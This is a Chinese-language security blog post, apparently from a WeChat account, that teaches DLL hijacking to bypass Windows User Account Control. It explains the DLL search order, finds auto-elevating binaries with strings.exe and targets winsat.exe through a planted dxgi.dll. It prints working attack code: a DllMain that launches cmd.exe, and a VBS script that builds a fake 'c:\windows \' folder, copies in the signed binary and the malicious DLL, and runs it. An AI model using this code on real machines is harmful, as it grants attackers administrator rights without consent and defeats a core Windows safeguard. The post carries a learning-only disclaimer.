> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/Gc5SuXfttpVXvtONwxArdg)

声明：⽂中所涉及的技术、思路和⼯具仅供以安全为⽬的的学习交流使⽤，任何⼈不得将其⽤于⾮法⽤途以及盈利等⽬的，否则后果⾃⾏承担。

  

0x01·简述  
在之前的文章中(文章没有发公众号，但是又不想改文字了)，已经详细的展示了利用dll劫持上线CS以达到权限维持。但也有很多遗留问题，像如何快速自动化挖掘，这篇文章会给大家详细展示。当然最主要的内容还是利用dll劫持进行bypass UAC，以及对上一篇文章某些内容做个详细的讲解。  
0x02·dll劫持（续）  
概念  
由于之前文章并没有详细说明dll劫持原理到底是什么，这里进行一个详细的补充。  
●注：概念内容更偏理论，因此部分内容源自于百度截取。  
DLL是Dynamic Link Library的缩写，意为动态链接库。在Windows中，许多应用程序并不是一个完整的可执行文件，它们被分割成一些相对独立的动态链接库，即DLL文件，放置于系统中。  
打个比方来说就像开发一个系统很多地方都需要用到相同的功能，那不可能每一次都重写代码，于是就把这个功能写出来打包成dll，下次再用直接调用这个dll文件就可以了。  
程序寻找dll的过程为：  
1.程序所在目录  
2.系统目录即 SYSTEM32 目录  
3.16位系统目录即 SYSTEM 目录  
4.Windows目录  
5.加载 DLL 时所在的当前目录  

6.PATH环境变量中列出的目录  

拿网易云的劫持来说， cloudmusic_reporter.exe需要调用libcurl.dll文件，提前把libcurl.dll替换成恶意构造的dll，那么cloudmusic_reporter.exe就会加载恶意构造的dll文件，这就达到了劫持目的。

  

![图片](https://mmbiz.qpic.cn/mmbiz_png/IBqeMoOWia85tib5dWTU0uNTAOPE1hVbcZNdMDFOic1bzAib7PAXwlehD7bd2B56zGYiaiaXAogNGmcPHAoVwP4pJdibg/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

0x03·bypass UAC  
UAC简介  
首先得知道什么是UAC，用户帐户控制（User Account Control，简写作UAC)是微软公司在其Windows Vista及更高版本操作系统中采用的一种控制机制。其原理是通知用户是否对应用程序使用硬盘驱动器和系统文件授权，以达到帮助阻止恶意程序（有时也称为“恶意软件”）损坏系统的效果。  
比如说这个大家都不陌生吧（手动狗头）。

![图片](https://mmbiz.qpic.cn/mmbiz_png/IBqeMoOWia85tib5dWTU0uNTAOPE1hVbcZdNxJ26BKaslLlD1LMOibA75Kb2Fs9JZLHqcpypPEOSsYGribLVpoZFDg/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

  
bypass_UAC原理  
bypass_UAC其实有很多种方式，例如：  
1.白名单提权机制 - autoElevate  
2.DLL 劫持  
3.Windows 自身漏洞提权  
4.远程注入  
5.COM 接口技术  
这里只详细介绍dll劫持达到bypass_UAC的目的，其它方式感兴趣的可以自行研究。  
而它的原理就是因为具有autoElevate属性True的应用程序会在启动时自动提升权限，而这些应用程序往往都具备微软的签名，微软认为它是可信的。通过dll劫持该类应用就能获得管理员权限。  
寻找提权程序工具详情见文末  
下载完成后，将其放入C:\Windows\System32目录下。  
运行命令 strings.exe -s *.exe | findstr /i autoelevate

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

通过搜索结果，找到autoElevate属性为true的程序，就选winsat.exe吧。  
运行后，利用工具查看其加载了哪些dll文件。

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

  
dll编写  
可以看到加载了dxgi.dll文件，接下就是编写dll文件了。

  

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

创建dll动态链接库项目，记得取消预编译头，配置好后尝试编译，查看是否成功。

  

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

写入一段打开cmd的代码再次进行编译。

  

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

整体代码如下：

```
`// dllmain.cpp : 定义 DLL 应用程序的入口点。``#include "pch.h"``#include "dxgi.h"``BOOL APIENTRY DllMain( HMODULE hModule,` `DWORD  ul_reason_for_call,` `LPVOID lpReserved` `)``{` `switch (ul_reason_for_call)` `{` `case DLL_PROCESS_ATTACH:` `{` `STARTUPINFO startInfo = { 0 };` `PROCESS_INFORMATION procInfo = { 0 };` `WCHAR cmdline[] = L"cmd.exe";` `CreateProcess(cmdline, NULL, NULL, NULL, FALSE, CREATE_NEW_CONSOLE, NULL, NULL, &startInfo, &procInfo);` `}` `case DLL_THREAD_ATTACH:` `case DLL_THREAD_DETACH:` `case DLL_PROCESS_DETACH:` `break;` `}` `return TRUE;``}`
```

  

接下来的问题就是这种系统dll都需要权限才能更改移动。

  

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

还好通过万能的百度搜索到一个VBS脚本可以来进行这些操作。  

具体代码如下：

```
`Set oFSO = CreateObject("Scripting.FileSystemObject")` `Set wshshell = wscript.createobject("WScript.Shell")` `' Get target binary and payload` `WScript.StdOut.Write("System32 binary: ")` `strBinary = WScript.StdIn.ReadLine()` `WScript.StdOut.Write("Path to your DLL: ")` `strDLL = WScript.StdIn.ReadLine()` `' Create folders` `Const target = "c:\windows \"` `target_sys32 = (target & "system32\")` `target_binary = (target_sys32 & strBinary)` `If Not oFSO.FolderExists(target) Then oFSO.CreateFolder target End If` `If Not oFSO.FolderExists(target_sys32) Then oFSO.CreateFolder target_sys32 End If` `' Copy legit binary and evil DLL` `oFSO.CopyFile ("c:\windows\system32\" & strBinary), target_binary` `oFSO.CopyFile strDLL, target_sys32` `' Run, Forrest, Run!` `wshshell.Run("""" & target_binary & """")` `' Clean files` `WScript.StdOut.Write("Clean up? (press enter to continue)")` `WScript.StdIn.ReadLine()``wshshell.Run("powershell /c ""rm -r """"\\?\" & target & """""""")`
```

之后运行看下效果如何。

  

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

  

  

0x04·总结  
总体来说就是一点点去查找可劫持dll很麻烦，但是这里找到了大神整理好的可劫持列表。  

github地址：https://github.com/wietze/windows-dll-hijacking/blob/master/dll_hijacking_candidates.csv

如果影响原来程序正常功能使用的问题只需新开一个线程即可。  

  

0x05·参考链接  
●http://payloads.online/archivers/2018-06-09/1  
●https://docs.microsoft.com/en-us/windows/desktop/dlls/dllmain  
●https://www.gdatasoftware.com/blog/2014/10/23941-com-object-hijacking-the-discreet-way-of-persistence  
●https://offsec.provadys.com/UAC-bypass-dotnet.html?utm_source=tuicool&utm_medium=referral  

  

**0x06·福利**

**关注公众号获取以下福利**

**1.关注公众号回复关键词** **入群** **获取群二维码**

**2.扫码入群回复关键词** **靶场密钥** **获取登录账户**

**3.扫码入群回复关键词** **靶场列表** **获取所有在线靶场IP**

**4.扫码入群回复关键词** **Bypass_UAC** **获取文中工具**